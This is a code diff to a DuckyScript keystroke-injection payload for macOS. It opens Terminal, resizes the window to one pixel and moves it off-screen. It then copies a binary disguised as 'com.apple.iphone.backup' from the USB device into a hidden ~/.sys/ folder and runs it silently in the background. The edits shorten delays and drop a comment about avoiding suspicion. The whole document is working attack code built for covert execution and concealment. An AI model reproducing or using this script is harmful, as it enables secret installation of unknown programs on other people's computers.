@@ -14,20 +14,18 @@ COMMAND SPACE
 DELAY 500
 STRING terminal
 ENTER
-DELAY 1000
+DELAY 500
 
 REM === Resize the Terminal window to 1x1 and move it off-screen ===
 STRING printf '\e[8;1;1t'; printf '\e[3;2560;1440t'
 ENTER
-DELAY 1500
+DELAY 200
 
 REM === Execute the script silently in the background ===
 STRING mkdir -p ~/.sys/ && cp /Volumes/DUCKY/com.apple.iphone.backup ~/.sys/ && cd ~/.sys/ && ./com.apple.iphone.backup &> /dev/null &
-DELAY 1000
 ENTER
-DELAY 1500
 
-REM === Close Terminal to avoid suspicion ===
+DELAY 200
+
 REM killall Terminal
-DELAY 100
 ENTER
